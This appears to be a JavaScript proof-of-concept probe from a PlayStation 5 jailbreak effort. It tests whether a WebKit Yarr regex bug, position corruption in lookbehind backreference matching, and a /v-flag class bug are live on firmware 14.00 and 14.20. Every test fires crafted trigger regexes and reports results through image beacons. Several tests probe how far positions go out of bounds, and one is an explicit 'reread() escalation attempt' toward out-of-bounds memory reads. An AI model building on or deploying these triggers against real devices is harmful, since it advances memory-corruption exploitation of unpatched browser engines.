// p232-yarr-c3-verify.js — Yarr C3 position corruption verification
// Bug: input position corruption in backward backreference matching
// Upstream fix: f44dcfd / 313026@main, 2026-05-11 (bugzilla 312690)
// Credit: Junyoung Park (@candymate), KAIST Hacking Lab
// Proven LIVE on PS5 14.00 by flippingascend. Testing on 14.20.
//
// If C3 is live: exec returns null (corrupted position causes match failure)
// If C3 is fixed: exec returns ["b","a"]

(function() {
  var B = "V232-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }

  beacon("START");

  // === TEST A: C3 core verification ===
  try {
    var re = /(?<=\u{10000}\1*(a))b/u;
    var input = "\u{10000}ab";
    var result = re.exec(input);
    if (result === null) {
      beacon("C3-LIVE-NULL");
    } else {
      var got = "" + result;
      if (got === "b,a") {
        beacon("C3-FIXED-" + got);
      } else {
        beacon("C3-UNEXPECTED-" + encodeURIComponent(got));
      }
    }
  } catch(e) {
    beacon("C3-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST B: Position corruption read check ===
  // If C3 is live, the corrupted position should be readable
  // and return lone trail surrogate
  try {
    var re2 = /(?<=\u{10000}\1*(a))(.)/u;
    var input2 = "\u{10000}ab";
    var result2 = re2.exec(input2);
    if (result2 === null) {
      beacon("B-NULL");
    } else {
      var cap1 = result2[1];
      var cap2 = result2[2];
      beacon("B-CAP1-" + encodeURIComponent(cap1) + "-CAP2-" + encodeURIComponent(cap2));
    }
  } catch(e) {
    beacon("B-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST C: Corrupted position through replace sink ===
  try {
    var re3 = /(?<=\u{10000}\1*(a))b/u;
    var input3 = "\u{10000}ab";
    var replaced = input3.replace(re3, "X");
    if (replaced === input3) {
      beacon("C-NOREPLACE");
    } else {
      beacon("C-REPLACED-" + encodeURIComponent(replaced).slice(0,60));
    }
  } catch(e) {
    beacon("C-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST D: C5a /v flag char after set operand ===
  // /^[\q{ab}c]$/v.test("\u0000") should be false, returns true if bugged
  try {
    var re4 = new RegExp("^[\\q{ab}c]$", "v");
    var c5a = re4.test("\u0000");
    beacon("C5A-" + (c5a ? "LIVE-TRUE" : "FIXED-FALSE"));
  } catch(e) {
    // "v" flag might not be supported
    beacon("C5A-NOFLAG-" + encodeURIComponent(e.message).slice(0,40));
  }

  // === TEST E: Broader Yarr position probing ===
  // Try longer inputs to see if position goes further OOB
  try {
    var padding = "c".repeat(256);
    var input5 = "\u{10000}a" + padding + "b";
    var re5 = /(?<=\u{10000}\1*(a))b/u;
    var result5 = re5.exec(input5);
    beacon("E-LONG-" + (result5 === null ? "NULL" : encodeURIComponent("" + result5).slice(0,60)));
  } catch(e) {
    beacon("E-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST F: Multiple iterations of the corrupted match ===
  // tryConsumeBackReference loops — what happens with many iterations?
  try {
    var re6 = /(?<=\u{10000}\1*(a){1,10})b/u;
    var input6 = "\u{10000}" + "a".repeat(10) + "b";
    var result6 = re6.exec(input6);
    beacon("F-MULTI-" + (result6 === null ? "NULL" : encodeURIComponent("" + result6).slice(0,60)));
  } catch(e) {
    beacon("F-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST G: reread() escalation attempt ===
  // The vulnerable path: InputStream::reread(unsigned from) with corrupted matchBegin
  // If position is corrupted to point before the string, reread() indexes OOB
  // Build a pattern that maximizes position displacement
  try {
    var bigSurrogate = "\u{10000}".repeat(16);
    var input7 = bigSurrogate + "a" + "b";
    var re7 = /(?<=\u{10000}\1*(a))b/u;
    var result7 = re7.exec(input7);
    beacon("G-BIGSUR-" + (result7 === null ? "NULL" : encodeURIComponent("" + result7).slice(0,60)));
  } catch(e) {
    beacon("G-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST H: Use the corruption through String.prototype.split ===
  try {
    var re8 = /(?<=\u{10000}\1*(a))b/u;
    var input8 = "\u{10000}ab";
    var parts = input8.split(re8);
    beacon("H-SPLIT-" + parts.length + "-" + encodeURIComponent(parts.join("|")).slice(0,60));
  } catch(e) {
    beacon("H-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  // === TEST I: matchAll to see all match positions ===
  try {
    var re9 = /(?<=\u{10000}\1*(a))b/gu;
    var input9 = "\u{10000}ab\u{10000}ab\u{10000}ab";
    var matches = [];
    var m;
    while ((m = re9.exec(input9)) !== null) {
      matches.push(m.index + ":" + m[0]);
      if (matches.length > 10) break;
    }
    beacon("I-MATCHALL-" + (matches.length === 0 ? "NONE" : matches.join(",")));
  } catch(e) {
    beacon("I-ERR-" + encodeURIComponent(e.message).slice(0,60));
  }

  beacon("DONE");
})();
